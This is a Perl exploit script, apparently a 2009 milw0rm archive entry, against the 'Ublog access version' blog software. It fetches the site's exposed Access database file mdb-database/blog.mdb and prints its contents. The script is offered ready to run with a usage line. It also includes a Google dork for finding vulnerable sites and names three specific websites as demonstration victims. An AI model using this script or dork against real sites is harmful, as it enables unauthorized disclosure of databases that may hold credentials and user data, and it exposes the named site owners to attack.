#!/usr/bin/perl
#
#
# Ublog access version
# mdb-database/blog.mdb
# dork : http://www.google.co.ma/search?q=index.asp%3Farchivio%3DOK&hl=fr&start=20&sa=N
# demos :
# http://radiologyhunters.com/blog/mdb-database/blog.mdb
# http://foges.net/mdb-database/blog.mdb
# http://www.geoaurea.it/mdb-database/blog.mdb
#
#
use LWP::Simple;
use LWP::UserAgent;

print "\tUblog access version Arbitrary Database Disclosure Exploit\n";

print "\t****************************************************************\n";
print "\t*      Found And Exploited By : Cyber-Zone (ABDELKHALEK)       *\n";
print "\t*           E-mail : Paradis_des_fous[at]hotmail.fr            *\n";
print "\t*          Home : WwW.IQ-TY.CoM , WwW.No-Exploit.CoM           *\n";
print "\t*               From : MoroccO Figuig/Oujda City               *\n";
print "\t****************************************************************\n\n\n\n";
if(@ARGV < 1)
{
&help; exit();
}
sub help()
{
print "[X] Usage : perl $0 site \n";
print "[X] Exemple : perl $0 www.site.com \n";
}
($site) = @ARGV;
print("Please Wait ! Connecting To The Server ......\n\n");
sleep(5);
$database = "mdb-database/blog.mdb";
my $exploit = "http://" . $site . "/" . $database;
print("Searching For file ...\n\n");
sleep(3);
$doexploit=get $exploit;
if($doexploit){
print("..........................File Contents...........................\n");
print("$doexploit\n");
print("..............................EOF.................................\n");
}
else {
help();
exit;
}

# milw0rm.com [2009-05-04]
